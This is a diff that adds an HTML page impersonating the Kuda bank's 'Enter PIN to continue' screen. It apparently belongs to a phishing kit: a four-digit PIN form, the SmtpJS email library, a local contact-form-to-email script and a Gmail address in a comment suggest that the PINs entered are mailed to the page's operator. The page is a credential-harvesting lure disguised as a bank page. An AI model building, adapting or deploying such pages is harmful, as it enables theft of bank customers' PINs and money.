@@ -1,0 +1,71 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta name="google-site-verification" content="X9D5oC1rFQ7yMLM4wOi-DP9xFpzTR28G03EeeXEdHxs" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kuda - PIN</title>
+    <link rel="stylesheet" href="kuda.css">
+    <script src="script.js"></script>
+    <link rel="shortcut icon" href="kuda_logo.png" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Mulish:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+    <link href="data:text/css,%5Bid*%3D'google_ads_iframe'%5D%2C%5Bid*%3D'taboola-'%5D%2C.taboolaHeight%2C.taboola-placeholder%2C%23credential_picker_container%2C%23credentials-picker-container%2C%23credential_picker_iframe%2C%5Bid*%3D'google-one-tap-iframe'%5D%2C%23google-one-tap-popup-container%2C.google-one-tap-modal-div%2C%23amp_floatingAdDiv%2C%23ez-content-blocker-container%2C%23notify-adblock%7Bdisplay%3Anone!important%3Bmin-height%3A0!important%3Bheight%3A0!important%3B%7D" rel="stylesheet" type="text/css">
+</head>
+    <body data-new-gr-c-s-check-loaded="8.906.0" data-gr-ext-installed="">
+        
+        <form id="form" class="form text-center mx-auto mt-9 pt-6 px-4 lg:px-0 flex flex-col justify-center" > <!--payday10177@gmail.com-->
+        
+            <p class="text-2xl font-bold text-left mb-6">Enter PIN to continue </p>
+            
+            <div class="inputsCtn flex justify-center my-4">
+
+                <input id="pin1" class="input  p-3 " oninput="inputInsideOtpInput(this)" name="pin1" required="" maxlength="1" type="tel">
+
+                <input id="pin2" class="input  p-3" oninput="inputInsideOtpInput(this)" name="pin2" required="" maxlength="1" type="tel">
+
+                <input id="pin3" class="input  p-3" oninput="inputInsideOtpInput(this)" name="pin3" required="" maxlength="1" type="tel">
+
+                <input id="pin4" class="input p-3" oninput="inputInsideOtpInput(this)" name="pin4" required="" maxlength="1" type="tel">
+            </div>
+            <button class="w-full py-3 px-3 font-bold text-white my-6" type="submit">Next</button>
+        </form>
+    
+
+
+    <script>
+        function inputInsideOtpInput(el) {
+            if (el.value.length > 1) {
+                el.value = el.value[el.value.length - 1];
+            }
+            try {
+                if (el.value == null || el.value == "") {
+                    this.foucusOnInput(el.previousElementSibling);
+                } else {
+                    this.foucusOnInput(el.nextElementSibling);
+                }
+            } catch (e) {
+                console.log(e);
+            }
+        }
+    
+        function foucusOnInput(ele) {
+            ele.focus();
+            let val = ele.value;
+            ele.value = "";
+            // ele.value = val;
+            setTimeout(() => {
+                ele.value = val;
+            })
+        }
+    </script>
+
+<script src="https://smtpjs.com/v3/smtp.js">
+
+
+</script>
+<script src="Contact-form-to-email1.js"></script>
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+</body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
